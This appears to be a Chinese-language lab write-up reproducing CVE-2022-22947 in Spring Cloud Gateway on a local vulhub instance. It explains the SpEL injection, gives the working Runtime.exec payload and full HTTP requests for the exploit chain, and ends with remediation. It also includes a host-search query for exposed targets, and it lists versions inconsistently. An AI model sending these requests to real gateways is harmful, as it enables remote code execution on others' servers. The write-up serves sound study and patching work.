# CVE-2022-22947

测绘空间搜索: `app = "vmware-SpringBoot-framework"` 

# 环境

> Spring Cloud Gateway 3.1.1
>
>  Spring Cloud Gateway 3.0.7
>
> 必须开启 ac

# 前置知识

架构和技术栈

Spring 生态 https://spring.io/projects/spring-cloud

**spEL 表达式**

Gateway 和 Spring Boot Actuator 关系

网关作用和解决方案

>  网关作用

```
智能路由
负载均衡
协议转换
权限校验
限流熔断
黑白名单 
API监控
日志审计
```

> 解决方案



```

```



Route(路由)

Predicate(断言)

Filter(过滤器)







# 漏洞原理

## 总的来说, 攻击者可以通过发送的数据包给Spring项目添加了网关(路由器)

> 而这个路由器, 最终只是远程代码执行

## 整个利用的关键过程如下:

```
1. 开启 Acutator, 可以通过接口列出路由(包括过滤器),例如:
/actuator/gateway/routes

2. 通过/gateway/routes/{id_route_to_create}创建路由

3.通过/actuator/gateway/refresh刷新路由

4. 当路由带有恶意的Filter的时候, 里面的spEL表达式就会被执行.

```

**其实SpEL表达式的目的也是为了在写成的时候灵活赋值, 但是 就像很不幸的是, 这种情况往往会被别人利用, 再如Log4j 漏洞也是因为 有个 `lookup` 来个程序灵活的赋值才导致的漏洞. **

对于本次的漏洞, 可以**找SpringCloudGateway的源码(注意: 看的是源码, 不是字节码)**, 里面有个文件叫 `ConfigurationService.java`, 利用有个`normalizeProperties` , 它会对参数进行处理,  而攻击者传入的就是一个可以被它执行的参数(类), `normalizeProperties会调用 normalize 方法`, 而 `normalize方法`是在另一个叫做`ShortcutConfigurable.java`文件中执行.

![image-20230410220423081](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410220423081.png)



![](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410221004176.png)



![image-20230410221226183](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410221226183.png)



## 关键的poc

```
"value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
```

​		解读:

```
new String[]{\"id\"}  的作用是  攻击者创建一个字符串,  名为 id

(java.lang.Runtime).getRuntime().exec()   的作用是 执行 exec括号里的东西, 也就是字符串

getInputStream() 的作用即使得到 上面exec执行的结果

springframework.util.StreamUtils)的copyToByteArray类 , 能够将得到的记过转换成为 字节数组

最后, 最外层的new String 将字符数组转换成了 字符串  .

```

# 复现漏洞

> **说明**: 
>
> 1. 我是用`docker` 来安装的`vulhub`
>
> 2. **我用本地电脑复现的漏洞, 所以下方所说的目标ip 就是我的`本地电脑的ip` , 并且我已经开启 8080端口.**



1. 启动SpringCloudGateway服务, 进入如下的文件夹:

```shell
cd /root/practiceplatform/vulhub/spring/CVE-2022-22947
```

得到如下的访问界面:

![image-20230410193209720](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410193209720.png)



2. 添加过滤器(用POST请求)

> 使用BP结果, 修改并重发数据包.

```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: xxx.xxx.xxx.xxx(也就是目标网站的ip):8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```

>  看到如下界面就说明**过滤器的规则**添加成功啦!:

![image-20230410193825459](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410193825459.png)



3. 刷新过滤器(用POST请求)

> 官网上的那个刷新的不能用, 我根据vulhub官网上的, 对照原本的数据包进行修改的. 

```
POST /actuator/gateway/refresh HTTP/1.1
Host: xxx.xxx.xxx.xxx(也就是目标网站的ip):8080
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 2

```

> 看到如下界面, 表示目标网站的网关刷新成功.

![image-20230410200247296](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410200247296.png)

4. 访问过滤器ID(用GET请求)

```
http://目标ip:8080/actuator/gateway/routes/hacktest
```

> 当然我们也可以直接在`BP`的`Repeater `模块中使用下面的请求数据, 当然, 个人觉得没有必要, **用浏览器正常访问, 不香吗?** 

```
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: xxx.xxx.xxx.xxx(也就是目标ip):8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20230410201723935](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410201723935.png)

> 这样, 漏洞就被利用成功啦!!!

> 补充:
>
> 当然我们也可以删除这个网关

```
DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: xxx.xxx.xxx.xxx(也就是目标ip):8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close

# 注意, 下面的这部分可能没有, 我在复现的时候没有成功删除网关
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}



```

> `删除网关之后需要再次刷新网关才能使删除生效.`



# 漏洞的修复

**两种方法:**

1. 升级SpringCloudGateway

> SpringCloudGateway >= 3.1.1
>
> SpringCloudGateway >= 3.0.7

2.  在不考虑影响业务的情况下, `禁用Actuato`r就可以了

```
management.endpoint.gateway.enable:false
```

![image-20230410222739928](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230410222739928.png)



